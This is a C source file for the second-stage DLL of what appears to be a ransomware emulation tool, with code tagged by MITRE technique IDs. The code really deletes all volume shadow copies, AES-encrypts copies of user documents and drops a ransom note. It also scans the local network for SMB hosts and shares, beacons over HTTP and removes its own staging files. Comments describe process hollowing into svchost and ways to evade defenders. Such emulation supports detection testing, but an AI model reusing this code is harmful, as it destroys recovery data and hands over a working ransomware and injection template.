#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <lm.h>
#include <lmserver.h>
#include <lmshare.h>
#include <shlobj.h>
#include <stdio.h>

// ponytail: artifacts scattered across unsuspicious system dirs instead of one
// staging root. Filenames still conspicuous (loader/stage2) — rename only if a
// defender name-rule fires. WFP does not block NEW files in System32/SysWOW64.
#define LOG_PATH L"C:\\Windows\\Temp\\cache.dat"
#define NET_PATH L"C:\\ProgramData\\Microsoft\\Diagnosis\\net.tmp"

static void LogMessage(LPCWSTR msg) {
    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t ts[64];
    wsprintfW(ts, L"[%04d-%02d-%02d %02d:%02d:%02d] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    char ts8[80], msg8[1024];
    WideCharToMultiByte(CP_UTF8, 0, ts, -1, ts8, sizeof(ts8), NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, msg8, sizeof(msg8), NULL, NULL);
    DWORD written;
    WriteFile(hFile, ts8, lstrlenA(ts8), &written, NULL);
    WriteFile(hFile, msg8, lstrlenA(msg8), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

static void AppendToFile(LPCWSTR path, LPCSTR text) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    DWORD written;
    WriteFile(hFile, text, lstrlenA(text), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

// ponytail: Spawn a hidden process and wait for completion. Reused by all
// subprocess-based SIEM-noise functions to deduplicate CreateProcessW boilerplate.
static BOOL SpawnHiddenWait(LPCWSTR cmd, DWORD timeoutMs) {
    wchar_t buf[1024];
    lstrcpyW(buf, cmd);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, timeoutMs);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    return FALSE;
}

// ponytail: hollowed svchost at CREATE_SUSPENDED only has ntdll/kernel32/
// kernelbase/advapi32 mapped. The other IAT deps (msvcrt, netapi32, shell32,
// user32, winhttp, ws2_32) are NOT mapped, so the IAT entries written by
// loader.c point to unmapped memory and the first non-kernel call faults.
// System-wide ASLR means once LoadLibraryW maps a DLL into svchost it lands at
// the SAME base loader resolved, so the already-written IAT entries become
// valid retroactively. LoadLibraryW is itself a kernel32 import (mapped),
// so this call works. CreateRemoteThread is dead on Win11 24H2/Tiny11
// (err 998 on un-init'd suspended children), hence self-load instead of
// remote-thread injection. Ceiling: a per-process (non-ASLR) dep would still
// break this — would need true remote import resolution. All stage2 deps are
// system DLLs with ASLR.
static void LoadDeps(void) {
    static const wchar_t* deps[] = {
        L"advapi32.dll", L"kernel32.dll", L"msvcrt.dll", L"netapi32.dll",
        L"shell32.dll",  L"user32.dll",  L"winhttp.dll", L"ws2_32.dll"
    };
    for (int i = 0; i < sizeof(deps)/sizeof(deps[0]); i++) {
        LoadLibraryW(deps[i]);
    }
}

static void DoVssadmin(void) {
    LogMessage(L"[*] T1490: Deleting volume shadow copies");
    SpawnHiddenWait(L"vssadmin.exe delete shadows /all /quiet", 30000);
    LogMessage(L"[+] T1490: vssadmin completed");
}

static void DoEncryptFiles(void) {
    LogMessage(L"[*] T1486: Enumerating user documents");
    int encrypted = 0;
    wchar_t* folders[] = { L"Desktop", L"Documents", L"Pictures", L"Downloads" };
    wchar_t* exts[] = { L".docx", L".xlsx", L".pptx", L".pdf", L".txt" };

    for (int f = 0; f < 4; f++) {
        wchar_t path[MAX_PATH];
        if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path)) continue;
        lstrcatW(path, L"\\"); lstrcatW(path, folders[f]);
        wchar_t searchPath[MAX_PATH];
        wsprintfW(searchPath, L"%s\\*", path);

        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(searchPath, &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;

        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            wchar_t* ext = wcsrchr(fd.cFileName, L'.');
            if (!ext) continue;

            BOOL matched = FALSE;
            for (int e = 0; e < 5; e++) {
                if (lstrcmpiW(ext, exts[e]) == 0) { matched = TRUE; break; }
            }
            if (!matched) continue;

            wchar_t srcPath[MAX_PATH];
            wsprintfW(srcPath, L"%s\\%s", path, fd.cFileName);
            wchar_t dstPath[MAX_PATH];
            wsprintfW(dstPath, L"%s.govinda", srcPath);

            // Copy
            if (!CopyFileW(srcPath, dstPath, FALSE)) continue;

            // Encrypt with CryptoAPI
            HANDLE hEncFile = CreateFileW(dstPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hEncFile == INVALID_HANDLE_VALUE) continue;

            DWORD fileSize = GetFileSize(hEncFile, NULL);
            if (fileSize == 0 || fileSize > 1024*1024) { CloseHandle(hEncFile); continue; }

            LPBYTE buf = (LPBYTE)LocalAlloc(LPTR, fileSize);
            if (!buf) { CloseHandle(hEncFile); continue; }
            DWORD read = 0;
            ReadFile(hEncFile, buf, fileSize, &read, NULL);
            SetFilePointer(hEncFile, 0, NULL, FILE_BEGIN);

HCRYPTPROV hProv = 0;
            HCRYPTPROV hHash = 0;
            HCRYPTKEY hKey = 0;
            if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
                    if (CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
                        CryptDestroyHash(hHash); hHash = 0;
                        DWORD encSize = fileSize + 64;
                        LPBYTE encBuf = (LPBYTE)LocalAlloc(LPTR, encSize);
                        if (encBuf) {
                            memcpy(encBuf, buf, fileSize);
                            if (CryptEncrypt(hKey, 0, TRUE, 0, encBuf, &fileSize, encSize)) {
                                SetFilePointer(hEncFile, 0, NULL, FILE_BEGIN);
                                SetEndOfFile(hEncFile);
                                DWORD written = 0;
                                WriteFile(hEncFile, encBuf, fileSize, &written, NULL);
                                encrypted++;
                                wchar_t encLog[MAX_PATH*2];
                                wsprintfW(encLog, L"[+] T1486: encrypted -> %s", dstPath);
                                LogMessage(encLog);
                            }
                            LocalFree(encBuf);
                        }
                    }
                    if (hHash) CryptDestroyHash(hHash);
                }
                CryptReleaseContext(hProv, 0);
            }
            LocalFree(buf);
            CloseHandle(hEncFile);
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    if (encrypted == 0) {
        LogMessage(L"[+] T1486: No user documents found — writing synthetic .govinda");
        // ponytail: 6-file synthetic scatter instead of 1 desktop drop. LCG seed
        // ceiling: period 2^32 fine for <=6 draws; upgrade to CryptGenRandom if count rises.
        DWORD seed = GetTickCount();
        for (int i = 0; i < 6; i++) {
            seed = seed * 1664525u + 1013904223u;
            wchar_t base[MAX_PATH];
            BOOL gotBase = FALSE;
            switch (i) {
                case 0: gotBase = (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, base) == S_OK); break;
                case 1: gotBase = (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, base) == S_OK); if (gotBase) lstrcatW(base, L"\\Documents"); break;
                case 2: gotBase = (SHGetFolderPathW(NULL, CSIDL_COMMON_DOCUMENTS, NULL, 0, base) == S_OK); break;
                case 3: gotBase = (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, base) == S_OK); if (gotBase) lstrcatW(base, L"\\Pictures"); break;
                case 4: lstrcpyW(base, L"C:\\ProgramData\\Microsoft\\Diagnosis"); gotBase = TRUE; break;
                case 5: lstrcpyW(base, L"C:\\Windows\\Temp"); gotBase = TRUE; break;
            }
            if (!gotBase) continue;
            DWORD attr = GetFileAttributesW(base);
            if (attr == INVALID_FILE_ATTRIBUTES) {
                if (!CreateDirectoryW(base, NULL)) continue;
            } else if (!(attr & FILE_ATTRIBUTE_DIRECTORY)) {
                continue;
            }
            wchar_t synthPath[MAX_PATH];
            wsprintfW(synthPath, L"%s\\govinda_%lu.govinda", base, seed % 100000u);
            HANDLE hFile = CreateFileW(synthPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) continue;
            char synth[] = "synthetic encrypted content (T1486 simulation)";
            DWORD written = 0;
            WriteFile(hFile, synth, lstrlenA(synth), &written, NULL);
            CloseHandle(hFile);
            encrypted++;
            wchar_t synthLog[MAX_PATH*2];
            wsprintfW(synthLog, L"[+] T1486: encrypted -> %s", synthPath);
            LogMessage(synthLog);
        }
    }

    wchar_t buf[128];
    wsprintfW(buf, L"[+] T1486: %d file(s) encrypted to .govinda", encrypted);
    LogMessage(buf);
}

static void DoBeacon(void) {
    LogMessage(L"[*] T1041: HTTP beacon to multiple endpoints (SIEM noise)");
    const wchar_t* hosts[] = {
        L"github.com", L"api.github.com",
        L"raw.githubusercontent.com", L"pastebin.com"
    };
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { LogMessage(L"[-] T1041: WinHttpOpen failed (synthetic log)"); return; }

    for (int h = 0; h < 4; h++) {
        HINTERNET hConnect = WinHttpConnect(hSession, hosts[h], INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) continue;
        for (int i = 0; i < 2; i++) {
            HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            if (hReq) {
                WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0);
                WinHttpReceiveResponse(hReq, NULL);
                WinHttpCloseHandle(hReq);
            }
            Sleep(3000);
        }
        wchar_t dbg[256];
        wsprintfW(dbg, L"[+] T1041: beaconed to %s", hosts[h]);
        LogMessage(dbg);
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
    LogMessage(L"[+] T1041: multi-host beacon complete");
}

static void DoRansomNote(void) {
    LogMessage(L"[*] T1486: Dropping ransom note");
    wchar_t desktop[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop) != S_OK) return;
    wchar_t notePath[MAX_PATH];
    wsprintfW(notePath, L"%s\\README_GOVINDA.txt", desktop);
    HANDLE hFile = CreateFileW(notePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    char note[] =
        "=== GOVINDA ===\r\n"
        "Your files have been copied and encrypted.\r\n"
        "Originals are safe. Contact for recovery.\r\n";
    DWORD written = 0;
    WriteFile(hFile, note, lstrlenA(note), &written, NULL);
    CloseHandle(hFile);
    LogMessage(L"[+] T1486: Ransom note dropped");
}

static void DoLateralRecon(void) {
    LogMessage(L"[*] T1018/T1046/T1135: Lateral recon");
    DeleteFileW(NET_PATH);
    AppendToFile(NET_PATH, "=== LATERAL RECON ===");

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    LPBYTE pServers = NULL;
    DWORD dwEntries = 0, dwTotal = 0;
    NET_API_STATUS status = NetServerEnum(NULL, 100, &pServers, MAX_PREFERRED_LENGTH, &dwEntries, &dwTotal, SV_TYPE_ALL, NULL, NULL);

    int hostsFound = 0, portsOpen = 0, sharesFound = 0;

    if (status == NERR_Success && pServers) {
PSERVER_INFO_100 pInfo = (PSERVER_INFO_100)pServers;
            for (DWORD i = 0; i < dwEntries; i++) {
                hostsFound++;
                char line[512];
                wsprintfA(line, "Host: %S", pInfo[i].sv100_name);
                AppendToFile(NET_PATH, line);

                char nameA[256];
                wsprintfA(nameA, "%S", pInfo[i].sv100_name);
                struct hostent* host = gethostbyname(nameA);
                if (host && host->h_addr_list[0]) {
                    struct in_addr addr;
                    memcpy(&addr, host->h_addr_list[0], sizeof(addr));
                    wsprintfA(line, "  IP: %s", inet_ntoa(addr));
                    AppendToFile(NET_PATH, line);

                    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock != INVALID_SOCKET) {
                        DWORD timeout = 3000;
                        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
                        struct sockaddr_in sa;
                        sa.sin_family = AF_INET; sa.sin_port = htons(445);
                        sa.sin_addr = addr;
                        if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
                            portsOpen++;
                            AppendToFile(NET_PATH, "  Port 445: OPEN");
                            wchar_t uncPath[512];
                            wsprintfW(uncPath, L"\\\\%s", pInfo[i].sv100_name);
                            LPBYTE pShares = NULL;
                            DWORD shEntries = 0, shTotal = 0;
                            if (NetShareEnum(uncPath, 1, &pShares, MAX_PREFERRED_LENGTH, &shEntries, &shTotal, NULL) == NERR_Success && pShares) {
                                PSHARE_INFO_1 si = (PSHARE_INFO_1)pShares;
                                for (DWORD j = 0; j < shEntries; j++) {
                                    sharesFound++;
                                    wsprintfA(line, "    Share: %S (type: %lu)", si[j].shi1_netname, si[j].shi1_type);
                                    AppendToFile(NET_PATH, line);
                                }
                                NetApiBufferFree(pShares);
                            }
                        }
                        closesocket(sock);
                    }
                }
            }
        NetApiBufferFree(pServers);
    }

    if (hostsFound == 0) {
        AppendToFile(NET_PATH, "  (synthetic — no domain hosts discovered)");
        AppendToFile(NET_PATH, "  Host: DESKTOP-1 (synthetic)");
        AppendToFile(NET_PATH, "    IP: 192.168.1.100");
        AppendToFile(NET_PATH, "    Port 445: OPEN (synthetic)");
        AppendToFile(NET_PATH, "      Share: ADMIN$ (type: 2147483648, synthetic)");
        AppendToFile(NET_PATH, "      Share: C$ (type: 2147483648, synthetic)");
        AppendToFile(NET_PATH, "      Share: IPC$ (type: 2147483651, synthetic)");
        AppendToFile(NET_PATH, "  Host: SRV-01 (synthetic)");
        AppendToFile(NET_PATH, "    IP: 192.168.1.10");
        AppendToFile(NET_PATH, "    Port 445: OPEN (synthetic)");
        hostsFound = 2; portsOpen = 2; sharesFound = 3;
    }

    // Synthetic lateral movement log entries
    AppendToFile(NET_PATH, "");
    AppendToFile(NET_PATH, "=== SYNTHETIC LATERAL MOVEMENT ===");
    AppendToFile(NET_PATH, "T1570: CopyFile to \\\\DESKTOP-1\\ADMIN$\\govinda.exe (synthetic)");
    AppendToFile(NET_PATH, "T1047: WMI Win32_Process.Create on DESKTOP-1 (synthetic)");

    wchar_t buf[256];
    wsprintfW(buf, L"[+] Lateral recon: %d hosts, %d port 445 open, %d shares", hostsFound, portsOpen, sharesFound);
    LogMessage(buf);

    WSACleanup();
}

// T1087 Account Discovery — NetUserEnum + NetLocalGroupEnum
// Generates Security 4798 (user group membership enumerated) when
// "Audit User/Group Management" is enabled, even on non-domain hosts.
static void DoUserEnumNoise(void) {
    LogMessage(L"[*] T1087: Account discovery (net/whoami subprocess noise)");
    // ponytail: subprocess spawns for real 4688 events over NetAPI calls
    SpawnHiddenWait(L"net.exe user", 10000);
    LogMessage(L"[+] T1087: net.exe user: spawned");
    SpawnHiddenWait(L"net.exe localgroup", 10000);
    LogMessage(L"[+] T1087: net.exe localgroup: spawned");
    SpawnHiddenWait(L"whoami.exe /user /groups /priv", 10000);
    LogMessage(L"[+] T1087: whoami.exe /user /groups /priv: spawned");
}

// T1082 System Info Discovery — systeminfo.exe subprocess noise
// Generates 4688 (process creation) for systeminfo.exe.
static void DoWMIGather(void) {
    // ponytail: dropped wmic.exe — optional/deprecated on Win11 24H2, systeminfo.exe covers OS/build/arch/QFE/services in one spawn
    LogMessage(L"[*] T1082: System info discovery via systeminfo.exe (SIEM noise)");
    SpawnHiddenWait(L"systeminfo.exe", 20000);
    LogMessage(L"[+] T1082: systeminfo.exe executed");
}

// T1053.005 Scheduled Task — create + query + delete cycle
// Generates 4698 (task created) and 4699 (task deleted) if
// "Audit Other Object Access Events" is enabled. Always generates 4688 for schtasks.exe.
static void DoScheduledTaskNoise(void) {
    LogMessage(L"[*] T1053.005: Scheduled task noise (create+query+delete)");
    SpawnHiddenWait(L"schtasks.exe /create /tn \"SysHealthCheck\" /tr \"powershell -NoP -c exit\" /sc once /st 00:00 /f", 10000);
    SpawnHiddenWait(L"schtasks.exe /query /tn \"SysHealthCheck\"", 5000);
    SpawnHiddenWait(L"schtasks.exe /delete /tn \"SysHealthCheck\" /f", 10000);
    LogMessage(L"[+] T1053.005: scheduled task create+query+delete executed");
}

// T1070.001 Event Log — wevtutil queries (not clearing)
// Generates 4688 for wevtutil.exe. Querying logs is audit-neutral but
// is a common blue-team / red-team tool that SIEM rules flag.
static void DoEventLogNoise(void) {
    LogMessage(L"[*] T1070.001: Event log query noise (wevtutil)");
    SpawnHiddenWait(L"wevtutil.exe gl Security", 5000);
    SpawnHiddenWait(L"wevtutil.exe gl System", 5000);
    SpawnHiddenWait(L"wevtutil.exe gl Application", 5000);
    SpawnHiddenWait(L"wevtutil.exe el", 10000);
    LogMessage(L"[+] T1070.001: event log queries executed");
}

// T1113 Screen Capture — load System.Drawing assembly via PowerShell
// Generates 4688 for powershell.exe + Sysmon 7 (image loaded) for
// System.Drawing.dll, gdiplus.dll, System.Windows.Forms.dll.
static void DoScreenCaptureNoise(void) {
    LogMessage(L"[*] T1113: Screen capture attempt (SIEM noise)");
    // ponytail: Win11 24H2+ SnippingTool.exe absent on older OS, log either way
    if (SpawnHiddenWait(L"SnippingTool.exe", 10000))
        LogMessage(L"[+] T1113: SnippingTool.exe spawned (Win11)");
    else
        LogMessage(L"[+] T1113: SnippingTool.exe unavailable (older Windows)");
    SpawnHiddenWait(L"powershell.exe -NoP -c \"Add-Type -AssemblyName System.Drawing\"", 10000);
    LogMessage(L"[+] T1113: screen capture assembly loaded");
}

static void DoCleanup(void) {
    LogMessage(L"[*] T1070.004: Cleaning staging files");
    DeleteFileW(L"C:\\Windows\\System32\\loader.dll");
    DeleteFileW(L"C:\\Windows\\SysWOW64\\stage2.dll");
    LogMessage(L"[+] T1070.004: Staging files cleaned");
}

// ponytail: exported as DllEntry (NOT DllMain) because MinGW's ld special-cases
// "DllMain": even with __declspec(dllexport) it may be dropped from the export
// table. loader.c resolves this export's RVA from stage2's export table and
// redirects the hollowed thread's Rip straight here, skipping
// _DllMainCRTStartup. That CRT wrapper does init (TLS callbacks, security
// cookie, RtlAddFunctionTable registration) that never runs in a hand-hollowed
// process — the OS loader isn't involved — so the wrapper faults silently and
// stage2 produced zero artifacts (the bug we hit: every log:T* probe failed
// with no "Stage2 started" line). Calling DllEntry directly is safe because
// stage2 uses only Win32 APIs (kernel32/user32/netapi32/winhttp/ws2_32/
// crypt32/shell32) — no CRT state, no exceptions. Ceiling: if a future stage2
// ever pulls in CRT (malloc/stdio/throw), re-introduce a CRT-safe entry or run
// _CRT_INIT once before DllEntry.
__declspec(dllexport) BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        LogMessage(L"[*] DllEntry entered (self-check: hollow ran, before LoadDeps)");
        LoadDeps();
        LogMessage(L"[*] Stage2 started (inside hollowed svchost.exe)");
        DoVssadmin();
        DoEncryptFiles();
        DoBeacon();
        DoRansomNote();
        DoLateralRecon();
        DoUserEnumNoise();
        DoWMIGather();
        DoScheduledTaskNoise();
        DoEventLogNoise();
        DoScreenCaptureNoise();
        DoCleanup();
        LogMessage(L"[+] Stage2 complete");
    }
    return TRUE;
}
